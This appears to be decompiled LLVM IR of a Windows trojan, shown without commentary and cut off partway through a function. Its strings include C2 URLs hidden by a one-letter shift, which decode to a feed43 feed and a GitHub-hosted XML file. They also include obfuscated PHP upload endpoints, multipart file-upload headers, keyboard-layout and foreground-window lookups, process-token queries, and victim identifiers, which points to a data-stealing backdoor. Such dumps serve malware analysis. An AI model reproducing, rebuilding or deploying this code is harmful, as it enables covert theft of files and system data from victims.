@global_var_426150 = local_unnamed_addr constant [274 x i8] c"Cache-Control: nOpenProcessTokenGetForegroundWin009042316 FirefoContent-Type: aphttps://en.wikipOU!7/2<XPX75*Bqqlla/5.0 (WindowsAccept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_425a84 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_425a98 = local_unnamed_addr constant [62 x i8] c" \5Ce3e7e71a0b28b5e96cc492e636722f73\5C4sVKAOvu3D\5CUYEfgEpXAOE.php\00"
@global_var_425ad0 = local_unnamed_addr constant [6 x i8] c"E.php\00"
@global_var_425aa8 = local_unnamed_addr constant [46 x i8] c"e96cc492e636722f73\5C4sVKAOvu3D\5CUYEfgEpXAOE.php\00"
@global_var_425ad4 = local_unnamed_addr constant i32 112
@global_var_425ab8 = local_unnamed_addr constant [30 x i8] c"73\5C4sVKAOvu3D\5CUYEfgEpXAOE.php\00"
@global_var_425ac8 = local_unnamed_addr constant [14 x i8] c"EfgEpXAOE.php\00"
@global_var_426180 = local_unnamed_addr constant [226 x i8] c"009042316 FirefoContent-Type: aphttps://en.wikipOU!7/2<XPX75*Bqqlla/5.0 (WindowsAccept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_426140 = local_unnamed_addr constant [290 x i8] c"Accept: text/htmCache-Control: nOpenProcessTokenGetForegroundWin009042316 FirefoContent-Type: aphttps://en.wikipOU!7/2<XPX75*Bqqlla/5.0 (WindowsAccept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_4261e0 = local_unnamed_addr constant [130 x i8] c"tml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_426230 = local_unnamed_addr constant [50 x i8] c"Content-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_4261f0 = local_unnamed_addr constant [114 x i8] c"ltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_425ad8 = local_unnamed_addr constant [4 x i8] c"200\00"
@global_var_425adc = local_unnamed_addr constant [8 x i8] c"Warning\00"
@global_var_425ae4 = local_unnamed_addr constant [6 x i8] c"Error\00"
@global_var_425aec = local_unnamed_addr constant [4 x i8] c"303\00"
@global_var_425af0 = local_unnamed_addr constant [3 x i8] c"||\00"
@global_var_425af4 = local_unnamed_addr constant [4 x i8] c"404\00"
@global_var_425af8 = local_unnamed_addr constant [11 x i8] c"\0A path- %S\00"
@global_var_4258b8 = local_unnamed_addr constant i32 92
@global_var_425b08 = local_unnamed_addr constant [4 x i8] c"###\00"
@global_var_426210 = local_unnamed_addr constant [82 x i8] c"Content-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_426110 = local_unnamed_addr constant [338 x i8] c"name=\22file\22; filGetModuleFileNamVtfsBhfou;Np{jmmAccept: text/htmCache-Control: nOpenProcessTokenGetForegroundWin009042316 FirefoContent-Type: aphttps://en.wikipOU!7/2<XPX75*Bqqlla/5.0 (WindowsAccept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_425b10 = local_unnamed_addr constant [15 x i8] c"retChunkID %d\0A\00"
@global_var_425b2c = local_unnamed_addr constant [6 x i8] c"ERROR\00"
@global_var_426130 = local_unnamed_addr constant [306 x i8] c"VtfsBhfou;Np{jmmAccept: text/htmCache-Control: nOpenProcessTokenGetForegroundWin009042316 FirefoContent-Type: aphttps://en.wikipOU!7/2<XPX75*Bqqlla/5.0 (WindowsAccept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_425e50 = local_unnamed_addr constant [16 x i8] c"form-urlencoded\00"
@global_var_4258bc = constant [13 x i16] %wide-string
@global_var_425b40 = local_unnamed_addr constant [13 x i8] c"GetTickCount\00"
@global_var_425b34 = local_unnamed_addr constant [5 x i16] %wide-string
@global_var_425b50 = local_unnamed_addr constant [7 x i16] %wide-string
@global_var_425924 = constant [3 x i16] %wide-string
@global_var_425b60 = constant [6 x i16] %wide-string
@global_var_425b6c = constant [5 x i16] %wide-string
@global_var_425b78 = constant [5 x i16] %wide-string
@global_var_425b84 = constant [5 x i16] %wide-string
@global_var_425b90 = constant [6 x i16] %wide-string
@global_var_425b9c = constant [6 x i16] %wide-string
@global_var_425ba8 = constant [5 x i16] %wide-string
@global_var_425bb4 = constant [6 x i16] %wide-string
@global_var_425bc0 = constant [5 x i16] %wide-string
@global_var_425bcc = constant [4 x i8] c"%s\0A\00"
@global_var_425bd0 = constant [8 x i16] %wide-string
@global_var_42bf54 = local_unnamed_addr global i32 0
@global_var_425be0 = constant [11 x i8] c"edg499.dat\00"
@global_var_425bec = local_unnamed_addr constant [10 x i8] c"&crc=e3a6\00"
@global_var_425bf0 = local_unnamed_addr constant [6 x i8] c"=e3a6\00"
@global_var_425bf8 = local_unnamed_addr constant [64 x i8] c"//e3e7e71a0b28b5e96cc492e636722f73//4sVKAOvu3D//ABDYot0NxyG.php\00"
@global_var_425c08 = local_unnamed_addr constant [48 x i8] c"e96cc492e636722f73//4sVKAOvu3D//ABDYot0NxyG.php\00"
@global_var_425c18 = local_unnamed_addr constant [32 x i8] c"73//4sVKAOvu3D//ABDYot0NxyG.php\00"
@global_var_425c28 = local_unnamed_addr constant [16 x i8] c"ABDYot0NxyG.php\00"
@global_var_425a90 = local_unnamed_addr constant [5 x i8] c"HTTP\00"
@global_var_425b20 = local_unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_425c38 = local_unnamed_addr constant [3 x i8] c"::\00"
@global_var_425b0c = local_unnamed_addr constant i32 48
@global_var_425c3c = local_unnamed_addr constant i32 56
@global_var_425c40 = local_unnamed_addr constant [3 x i8] c"23\00"
@global_var_425c44 = local_unnamed_addr constant [11 x i8] c"TPX499.dat\00"
@global_var_425c50 = local_unnamed_addr constant [3 x i8] c"13\00"
@global_var_425c54 = local_unnamed_addr constant [11 x i8] c"AdbFle.tmp\00"
@global_var_425c60 = local_unnamed_addr constant i32 52
@global_var_425c64 = local_unnamed_addr constant i32 53
@global_var_425c68 = local_unnamed_addr constant [3 x i8] c"33\00"
@global_var_425c6c = local_unnamed_addr constant [3 x i16] %wide-string
@global_var_425a88 = local_unnamed_addr constant [3 x i8] c"//\00"
@global_var_425a8c = local_unnamed_addr constant i32 47
@global_var_425c74 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_425c84 = local_unnamed_addr constant [12 x i8] c"data --> %s\00"
@global_var_4258b0 = constant [8 x i8] c"http://\00"
@global_var_425c90 = constant [9 x i8] c"https://\00"
@global_var_42bf28 = local_unnamed_addr global i32 0
@global_var_425c9c = constant [5 x i8] c"&r=1\00"
@global_var_425ca4 = constant [14 x i8] c"404 Not Found\00"
@global_var_425cb4 = constant [3 x i8] c"[[\00"
@global_var_425cb8 = constant [3 x i8] c"]]\00"
@global_var_42bf14 = local_unnamed_addr global i32 0
@global_var_425cbc = constant [40 x i8] c"iuuqt;00gffe54/dpn09719147393382293/ynm\00"
@global_var_425ce8 = constant [66 x i8] c"iuuqt;00sbx/hjuivcvtfsdpoufou/dpn0sj{wjsfinbo0si1n0nbtufs0ynm/ynm\00"
@global_var_4261a0 = local_unnamed_addr constant [194 x i8] c"https://en.wikipOU!7/2<XPX75*Bqqlla/5.0 (WindowsAccept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_425d2c = constant [6 x i8] c"blog1\00"
@global_var_425d34 = constant [4 x i8] c"%d\0A\00"
@global_var_425d40 = local_unnamed_addr constant [5 x i8] c"/emm\00"
@global_var_425d38 = local_unnamed_addr constant [13 x i8] c"lfsofm43/emm\00"
@global_var_425d44 = local_unnamed_addr constant i32 0
@global_var_425d48 = constant [13 x i8] c"CreateMutexA\00"
@global_var_425d58 = local_unnamed_addr constant [50 x i8] c"com_mycompany_apps_appname_new_my_donalduckcompny\00"
@global_var_425d68 = local_unnamed_addr constant [34 x i8] c"ps_appname_new_my_donalduckcompny\00"
@global_var_42bf1c = local_unnamed_addr global i32 0
@global_var_425d78 = local_unnamed_addr constant [18 x i8] c"y_donalduckcompny\00"
@global_var_425d8c = constant [25 x i8] c"https://en.wikipedia.org\00"
@global_var_426120 = local_unnamed_addr constant [322 x i8] c"GetModuleFileNamVtfsBhfou;Np{jmmAccept: text/htmCache-Control: nOpenProcessTokenGetForegroundWin009042316 FirefoContent-Type: aphttps://en.wikipOU!7/2<XPX75*Bqqlla/5.0 (WindowsAccept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_42bf18 = local_unnamed_addr global i32 0
@global_var_42bf20 = local_unnamed_addr global i32 0
@global_var_42bf0c = local_unnamed_addr global i32 0
@global_var_425da8 = constant [11 x i16] %wide-string
@global_var_4261b0 = local_unnamed_addr constant [178 x i8] c"OU!7/2<XPX75*Bqqlla/5.0 (WindowsAccept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_425dc0 = local_unnamed_addr constant [6 x i8] c"uuid=\00"
@global_var_425dc8 = local_unnamed_addr constant [5 x i8] c"#un=\00"
@global_var_42bf24 = global i32 0
@global_var_41d370 = constant [18 x i8] c"Unknown exception\00"
@global_var_429894 = local_unnamed_addr global i32 0
@global_var_42e084 = local_unnamed_addr global i32 0
@global_var_4298a0 = local_unnamed_addr global i32 0
@global_var_42cfe0 = global i32 0
@global_var_4288e0 = local_unnamed_addr global i32* @global_var_42cfe0
@global_var_4298d0 = local_unnamed_addr global i32 0
@global_var_4298d4 = local_unnamed_addr global i32 0
@global_var_428b70 = local_unnamed_addr constant [5 x i8] c"sqrt\00"
@global_var_420fb0 = local_unnamed_addr constant i32 0
@global_var_42a070 = local_unnamed_addr global i32 0
@global_var_42a170 = local_unnamed_addr global i32 0
@global_var_42a17c = local_unnamed_addr global i32 0
@global_var_42a188 = local_unnamed_addr global i32 0
@global_var_4298e0 = local_unnamed_addr global i32 0
@global_var_42dfe0 = local_unnamed_addr global i32 0
@global_var_428fc0 = local_unnamed_addr global i32 429065504
@global_var_42bfac = local_unnamed_addr global i32 0
@global_var_42bfb0 = local_unnamed_addr global i32 0
@global_var_42bfb4 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_42a3c0 = local_unnamed_addr global i16* null
@global_var_42aeb0 = local_unnamed_addr global i16* null
@global_var_42b6b0 = local_unnamed_addr global i16* null
@global_var_42ae98 = local_unnamed_addr global i16 0
@global_var_42aea4 = local_unnamed_addr global i16 0
@global_var_42aea2 = local_unnamed_addr global i16 0
@global_var_42aea0 = local_unnamed_addr global i16 0
@global_var_42ae9e = local_unnamed_addr global i16 0
@global_var_42ae9a = local_unnamed_addr global i16 0
@global_var_42a5c8 = local_unnamed_addr global i16* null
@global_var_43005b = external constant i128
@global_var_4260b0 = external local_unnamed_addr constant i128
@global_var_425fd0 = external local_unnamed_addr constant i128
@global_var_422f78 = external local_unnamed_addr constant i128
@global_var_422f88 = external local_unnamed_addr constant i128
@global_var_422f98 = external local_unnamed_addr constant i128
@global_var_422fa8 = local_unnamed_addr constant i64 -8540519122497776167
@global_var_425f00 = external local_unnamed_addr constant i128
@global_var_425a86 = local_unnamed_addr constant i8 0
@global_var_425b04 = local_unnamed_addr constant i16 34
@1 = internal constant [2 x i8] c"r\00"
@global_var_425b28 = local_unnamed_addr constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_425e60 = external local_unnamed_addr constant i128
@global_var_426020 = external local_unnamed_addr constant i128
@global_var_4260a0 = external local_unnamed_addr constant i128
@global_var_426010 = external local_unnamed_addr constant i128
@global_var_4260d0 = external local_unnamed_addr constant i128
@global_var_425fb0 = external local_unnamed_addr constant i128
@global_var_425bf4 = local_unnamed_addr constant i16 54
@global_var_425d88 = local_unnamed_addr constant i16 121
@global_var_426100 = external local_unnamed_addr constant i128
@global_var_425ec0 = external local_unnamed_addr constant i128
@global_var_425fe0 = external local_unnamed_addr constant i128
@global_var_425ed0 = external local_unnamed_addr constant i128
@global_var_425f50 = external local_unnamed_addr constant i128
@global_var_425e70 = external local_unnamed_addr constant i128
@global_var_425dc4 = local_unnamed_addr constant i16 61
@global_var_425dcc = local_unnamed_addr constant i8 0
@global_var_420fc4 = local_unnamed_addr constant double 1.000000e+00
@global_var_41d2f4 = local_unnamed_addr constant %vtable_41d2f4_type { i32 (i32)* @"??_GFreeThreadProxy@details@Concurrency@@UAEPAXI@Z", i32 ()* @function_40d183 }
@global_var_41d318 = local_unnamed_addr constant %vtable_41d318_type { i32 (i32)* @"??_G?$_AnonymousOriginator@I@details@Concurrency@@UAEPAXI@Z" }
@global_var_41d368 = local_unnamed_addr constant %vtable_41d368_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_40d183 }
@global_var_4225bc = local_unnamed_addr constant %vtable_4225bc_type { i32 (i8)* @function_404420, i32 ()* @function_404550, i32 (i32, i32)* @function_404560, i32 (i32, i32)* @function_404450, i32 (i32, i32)* @function_4044b0, i32 (i32, i32)* @function_404470 }
@vtable_4225f4 = local_unnamed_addr global %vtable_4225f4_type { i32 (i32)* @"??_GThreadProxy@details@Concurrency@@UAEPAXI@Z", i32 ()* @function_40d183 }
@vtable_42260c = local_unnamed_addr global %vtable_42260c_type { i32 (i32)* @"??_GThreadProxy@details@Concurrency@@UAEPAXI@Z", i32 ()* @function_40d183, i32 (i32, i32)* @___DestructExceptionObject }
@global_var_42261c = local_unnamed_addr constant %vtable_42261c_type { i32 (i32)* @"??_GFreeThreadProxy@details@Concurrency@@UAEPAXI@Z.8", i32 ()* @function_40d183 }
@global_var_425a20 = local_unnamed_addr constant %vtable_425a20_type { i32 (i8)* @function_404c70, i32 ()* @function_404ca0 }

define i32 @function_404420(i8 %arg1) {
dec_label_pc_404420:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = and i8 %arg1, 1, !insn.addr !0
  %2 = icmp eq i8 %1, 0, !insn.addr !0
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1
  store i32 ptrtoint (i32* @global_var_422584 to i32), i32* %3, align 4, !insn.addr !1
  br i1 %2, label %dec_label_pc_40443b, label %dec_label_pc_404432, !insn.addr !2

dec_label_pc_404432:                              ; preds = %dec_label_pc_404420
  call void @_free(i32* %3), !insn.addr !3
  br label %dec_label_pc_40443b, !insn.addr !4

dec_label_pc_40443b:                              ; preds = %dec_label_pc_404432, %dec_label_pc_404420
  ret i32 %0, !insn.addr !5
}

define i32 @function_404450(i32 %arg1, i32 %arg2) {
dec_label_pc_404450:
  %0 = inttoptr i32 %arg1 to i32*, !insn.addr !6
  store i32 %arg2, i32* %0, align 4, !insn.addr !6
  %1 = add i32 %arg1, 4, !insn.addr !7
  %2 = inttoptr i32 %1 to i32*, !insn.addr !7
  ret i32 %arg1, !insn.addr !8
}

define i32 @function_404470(i32 %arg1, i32 %arg2) {
dec_label_pc_404470:
  %eax.0.reg2mem = alloca i32, !insn.addr !9
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 4, !insn.addr !10
  %2 = inttoptr i32 %1 to i32*, !insn.addr !10
  %3 = load i32, i32* %2, align 4, !insn.addr !10
  %4 = add i32 %arg2, 4, !insn.addr !11
  %5 = inttoptr i32 %4 to i32*, !insn.addr !11
  %6 = load i32, i32* %5, align 4, !insn.addr !11
  %7 = icmp eq i32 %3, %6, !insn.addr !11
  %8 = icmp eq i1 %7, false, !insn.addr !12
  br i1 %8, label %dec_label_pc_40449b, label %dec_label_pc_40448d, !insn.addr !12

dec_label_pc_40448d:                              ; preds = %dec_label_pc_404470
  %9 = inttoptr i32 %arg2 to i32*, !insn.addr !13
  %10 = load i32, i32* %9, align 4, !insn.addr !13
  %11 = icmp eq i32 %3, %10, !insn.addr !13
  %12 = icmp eq i1 %11, false, !insn.addr !14
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !14
  br i1 %12, label %dec_label_pc_40449b, label %dec_label_pc_404493, !insn.addr !14

dec_label_pc_404493:                              ; preds = %dec_label_pc_40448d
  %13 = and i32 %3, -256, !insn.addr !15
  %14 = or i32 %13, 1, !insn.addr !15
  ret i32 %14, !insn.addr !16

dec_label_pc_40449b:                              ; preds = %dec_label_pc_40448d, %dec_label_pc_404470
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %15 = and i32 %eax.0.reload, -256, !insn.addr !17
  ret i32 %15, !insn.addr !18
}

define i32 @function_4044b0(i32 %arg1, i32 %arg2) {
dec_label_pc_4044b0:
  %eax.0.reg2mem = alloca i32, !insn.addr !19
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %arg1, 4, !insn.addr !20
  %2 = inttoptr i32 %1 to i32*, !insn.addr !20
  %3 = load i32, i32* %2, align 4, !insn.addr !20
  %4 = icmp eq i32 %0, %3, !insn.addr !20
  %5 = icmp eq i1 %4, false, !insn.addr !21
  store i32 %arg1, i32* %eax.0.reg2mem, !insn.addr !21
  br i1 %5, label %dec_label_pc_4044c8, label %dec_label_pc_4044bb, !insn.addr !21

dec_label_pc_4044bb:                              ; preds = %dec_label_pc_4044b0
  %6 = inttoptr i32 %arg1 to i32*, !insn.addr !22
  %7 = load i32, i32* %6, align 4, !insn.addr !22
  %8 = icmp eq i32 %7, %arg2, !insn.addr !23
  %9 = icmp eq i1 %8, false, !insn.addr !24
  store i32 %7, i32* %eax.0.reg2mem, !insn.addr !24
  br i1 %9, label %dec_label_pc_4044c8, label %dec_label_pc_4044c2, !insn.addr !24

dec_label_pc_4044c2:                              ; preds = %dec_label_pc_4044bb
  %10 = and i32 %7, -256, !insn.addr !25
  %11 = or i32 %10, 1, !insn.addr !25
  ret i32 %11, !insn.addr !26

dec_label_pc_4044c8:                              ; preds = %dec_label_pc_4044bb, %dec_label_pc_4044b0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %12 = and i32 %eax.0.reload, -256, !insn.addr !27
  ret i32 %12, !insn.addr !28
}

define i32 @function_4044e0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4044e0:
  %.in.reg2mem = alloca i32, !insn.addr !29
  %0 = call i32 @"?_Syserror_map@std@@YAPBDH@Z"(i32 %arg2), !insn.addr !30
  %1 = icmp eq i32 %0, 0, !insn.addr !31
  %2 = icmp eq i1 %1, false, !insn.addr !32
  %3 = select i1 %2, i32 %0, i32 ptrtoint ([14 x i8]* @global_var_4258e4 to i32), !insn.addr !32
  %4 = add i32 %arg1, 20, !insn.addr !33
  %5 = inttoptr i32 %4 to i32*, !insn.addr !33
  store i32 15, i32* %5, align 4, !insn.addr !33
  %6 = add i32 %arg1, 16, !insn.addr !34
  %7 = inttoptr i32 %6 to i32*, !insn.addr !34
  store i32 0, i32* %7, align 4, !insn.addr !34
  %8 = inttoptr i32 %arg1 to i8*, !insn.addr !35
  store i8 0, i8* %8, align 1, !insn.addr !35
  %9 = inttoptr i32 %3 to i8*, !insn.addr !36
  %10 = load i8, i8* %9, align 1, !insn.addr !36
  %11 = icmp eq i8 %10, 0, !insn.addr !36
  %12 = icmp eq i1 %11, false, !insn.addr !37
  store i32 %3, i32* %.in.reg2mem, !insn.addr !37
  br i1 %12, label %dec_label_pc_404534.dec_label_pc_404534_crit_edge, label %dec_label_pc_40451a, !insn.addr !37

dec_label_pc_40451a:                              ; preds = %dec_label_pc_4044e0
  %13 = call i32 @function_4047e0(i32 %3, i32 0), !insn.addr !38
  ret i32 %arg1, !insn.addr !39

dec_label_pc_404534.dec_label_pc_404534_crit_edge: ; preds = %dec_label_pc_4044e0, %dec_label_pc_404534.dec_label_pc_404534_crit_edge
  %.in.reload = load i32, i32* %.in.reg2mem
  %14 = add i32 %.in.reload, 1
  %.phi.trans.insert = inttoptr i32 %14 to i8*
  %.pre = load i8, i8* %.phi.trans.insert, align 1
  %15 = icmp eq i8 %.pre, 0, !insn.addr !40
  %16 = icmp eq i1 %15, false, !insn.addr !41
  store i32 %14, i32* %.in.reg2mem, !insn.addr !41
  br i1 %16, label %dec_label_pc_404534.dec_label_pc_404534_crit_edge, label %dec_label_pc_40453b, !insn.addr !41

dec_label_pc_40453b:                              ; preds = %dec_label_pc_404534.dec_label_pc_404534_crit_edge
  %17 = sub i32 %14, %3, !insn.addr !42
  %18 = call i32 @function_4047e0(i32 %3, i32 %17), !insn.addr !43
  ret i32 %arg1, !insn.addr !44
}

define i32 @function_404550() {
dec_label_pc_404550:
  ret i32 ptrtoint ([9 x i8]* @global_var_4258f4 to i32), !insn.addr !45
}

define i32 @function_404560(i32 %arg1, i32 %arg2) {
dec_label_pc_404560:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = icmp eq i32 %arg2, 1, !insn.addr !46
  %3 = icmp eq i1 %2, false, !insn.addr !47
  br i1 %3, label %dec_label_pc_40459f, label %dec_label_pc_404577, !insn.addr !47

dec_label_pc_404577:                              ; preds = %dec_label_pc_404560
  %4 = add i32 %arg1, 20, !insn.addr !48
  %5 = inttoptr i32 %4 to i32*, !insn.addr !48
  store i32 15, i32* %5, align 4, !insn.addr !48
  %6 = add i32 %arg1, 16, !insn.addr !49
  %7 = inttoptr i32 %6 to i32*, !insn.addr !49
  store i32 0, i32* %7, align 4, !insn.addr !49
  %8 = inttoptr i32 %arg1 to i8*, !insn.addr !50
  store i8 0, i8* %8, align 1, !insn.addr !50
  %9 = call i32 @function_4047e0(i32 ptrtoint ([22 x i8]* @global_var_425900 to i32), i32 21), !insn.addr !51
  ret i32 %arg1, !insn.addr !52

dec_label_pc_40459f:                              ; preds = %dec_label_pc_404560
  %10 = call i32 @function_4044e0(i32 %arg1, i32 %arg2, i32 %0, i32 0, i32 %1), !insn.addr !53
  ret i32 %arg1, !insn.addr !54
}

define i32 @function_4047e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4047e0:
  %.reg2mem15 = alloca i32, !insn.addr !55
  %storemerge3.reg2mem = alloca i32, !insn.addr !55
  %merge.reg2mem = alloca i32, !insn.addr !55
  %ecx.17.reg2mem = alloca i32, !insn.addr !55
  %esp.09.in.reg2mem = alloca i32*, !insn.addr !55
  %.reg2mem = alloca i32, !insn.addr !55
  %.pre-phi14.reg2mem = alloca i32*, !insn.addr !55
  %ecx.0.reg2mem = alloca i32, !insn.addr !55
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %5 = icmp eq i32 %arg1, 0, !insn.addr !56
  br i1 %5, label %dec_label_pc_404845, label %dec_label_pc_4047ee, !insn.addr !57

dec_label_pc_4047ee:                              ; preds = %dec_label_pc_4047e0
  %6 = add i32 %4, 20, !insn.addr !58
  %7 = inttoptr i32 %6 to i32*, !insn.addr !58
  %8 = load i32, i32* %7, align 4, !insn.addr !58
  store i32 %8, i32* %ecx.0.reg2mem
  br label %dec_label_pc_404845

dec_label_pc_404845:                              ; preds = %dec_label_pc_4047ee, %dec_label_pc_4047e0
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %9 = icmp eq i32 %arg2, -1
  br i1 %9, label %dec_label_pc_4048cc, label %dec_label_pc_40484e, !insn.addr !59

dec_label_pc_40484e:                              ; preds = %dec_label_pc_404845
  %10 = add i32 %4, 20, !insn.addr !60
  %11 = inttoptr i32 %10 to i32*, !insn.addr !60
  %12 = load i32, i32* %11, align 4, !insn.addr !60
  %13 = icmp ult i32 %12, %arg2, !insn.addr !61
  %14 = icmp eq i1 %13, false, !insn.addr !62
  br i1 %14, label %dec_label_pc_40486e, label %dec_label_pc_404855, !insn.addr !62

dec_label_pc_404855:                              ; preds = %dec_label_pc_40484e
  %15 = add i32 %4, 16
  %16 = inttoptr i32 %15 to i32*
  %17 = load i32, i32* %16, align 4, !insn.addr !63
  store i32 %arg2, i32* %stack_var_-24, align 4, !insn.addr !64
  %18 = call i32 @function_404980(i32 %arg2, i32 %17, i32 %0, i32 %1, i32 %3, i32 %2), !insn.addr !65
  %19 = icmp eq i32 %arg2, 0, !insn.addr !66
  br i1 %19, label %dec_label_pc_4048c3, label %dec_label_pc_404855.dec_label_pc_40489a_crit_edge, !insn.addr !67

dec_label_pc_404855.dec_label_pc_40489a_crit_edge: ; preds = %dec_label_pc_404855
  %.pre = load i32, i32* %11, align 4
  store i32* %16, i32** %.pre-phi14.reg2mem
  store i32 %.pre, i32* %.reg2mem
  store i32* %stack_var_-24, i32** %esp.09.in.reg2mem
  br label %dec_label_pc_4048a5

dec_label_pc_40486e:                              ; preds = %dec_label_pc_40484e
  %20 = icmp eq i32 %arg2, 0, !insn.addr !68
  %21 = icmp eq i1 %20, false, !insn.addr !69
  %.pre12 = add i32 %4, 16
  %.pre13 = inttoptr i32 %.pre12 to i32*
  store i32* %.pre13, i32** %.pre-phi14.reg2mem, !insn.addr !69
  store i32 %12, i32* %.reg2mem, !insn.addr !69
  store i32* %stack_var_-16, i32** %esp.09.in.reg2mem, !insn.addr !69
  store i32 %ecx.0.reload, i32* %ecx.17.reg2mem, !insn.addr !69
  br i1 %21, label %dec_label_pc_4048a5, label %dec_label_pc_404872, !insn.addr !69

dec_label_pc_404872:                              ; preds = %dec_label_pc_40486e
  store i32 %arg2, i32* %.pre13, align 4, !insn.addr !70
  %22 = icmp ult i32 %12, 16, !insn.addr !71
  br i1 %22, label %dec_label_pc_404888, label %dec_label_pc_40487a, !insn.addr !72

dec_label_pc_40487a:                              ; preds = %dec_label_pc_404872
  %23 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !73
  store i8 0, i8* %23, align 1, !insn.addr !73
  ret i32 %4, !insn.addr !74

dec_label_pc_404888:                              ; preds = %dec_label_pc_404872
  %24 = inttoptr i32 %4 to i8*, !insn.addr !75
  store i8 0, i8* %24, align 1, !insn.addr !75
  ret i32 %4, !insn.addr !76

dec_label_pc_4048a5:                              ; preds = %dec_label_pc_40486e, %dec_label_pc_404855.dec_label_pc_40489a_crit_edge
  %ecx.17.reload = load i32, i32* %ecx.17.reg2mem
  %esp.09.in.reload = load i32*, i32** %esp.09.in.reg2mem
  %.reload = load i32, i32* %.reg2mem, !insn.addr !77
  %.pre-phi14.reload = load i32*, i32** %.pre-phi14.reg2mem
  %esp.09 = ptrtoint i32* %esp.09.in.reload to i32
  %25 = icmp ult i32 %.reload, 16, !insn.addr !77
  %storemerge = select i1 %25, i32 %4, i32 %ecx.17.reload
  %26 = add i32 %esp.09, -4, !insn.addr !78
  %27 = inttoptr i32 %26 to i32*, !insn.addr !78
  store i32 %arg2, i32* %27, align 4, !insn.addr !78
  %28 = add i32 %esp.09, -8, !insn.addr !79
  %29 = inttoptr i32 %28 to i32*, !insn.addr !79
  store i32 %arg1, i32* %29, align 4, !insn.addr !79
  %30 = add i32 %esp.09, -12, !insn.addr !80
  %31 = inttoptr i32 %30 to i32*, !insn.addr !80
  store i32 %storemerge, i32* %31, align 4, !insn.addr !80
  %32 = call i32 @_memcpy.1(), !insn.addr !81
  %.pre10 = load i32, i32* %11, align 4
  %33 = icmp ult i32 %.pre10, 16, !insn.addr !82
  store i32 %arg2, i32* %.pre-phi14.reload, align 4, !insn.addr !83
  br i1 %33, label %dec_label_pc_4048bd, label %dec_label_pc_4048ae, !insn.addr !84

dec_label_pc_4048ae:                              ; preds = %dec_label_pc_4048a5
  %34 = add i32 %ecx.17.reload, %arg2, !insn.addr !85
  %35 = inttoptr i32 %34 to i8*, !insn.addr !85
  store i8 0, i8* %35, align 1, !insn.addr !85
  ret i32 %4, !insn.addr !86

dec_label_pc_4048bd:                              ; preds = %dec_label_pc_4048a5
  %36 = add i32 %4, %arg2, !insn.addr !87
  %37 = inttoptr i32 %36 to i8*, !insn.addr !87
  store i8 0, i8* %37, align 1, !insn.addr !87
  br label %dec_label_pc_4048c3, !insn.addr !87

dec_label_pc_4048c3:                              ; preds = %dec_label_pc_40491f, %dec_label_pc_404961, %dec_label_pc_4048bd, %dec_label_pc_404855
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !88

dec_label_pc_4048cc:                              ; preds = %dec_label_pc_404845
  %38 = call i32 @"?_Xinvalid_argument@std@@YAXPBD@Z"(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_425944, i32 0, i32 0)), !insn.addr !89
  %39 = call i32 @__asm_int3(), !insn.addr !90
  %40 = call i32 @__asm_int3(), !insn.addr !91
  %41 = call i32 @__asm_int3(), !insn.addr !92
  %42 = call i32 @__asm_int3(), !insn.addr !93
  %43 = call i32 @__asm_int3(), !insn.addr !94
  %44 = call i32 @__asm_int3(), !insn.addr !95
  %45 = call i32 @__asm_int3(), !insn.addr !96
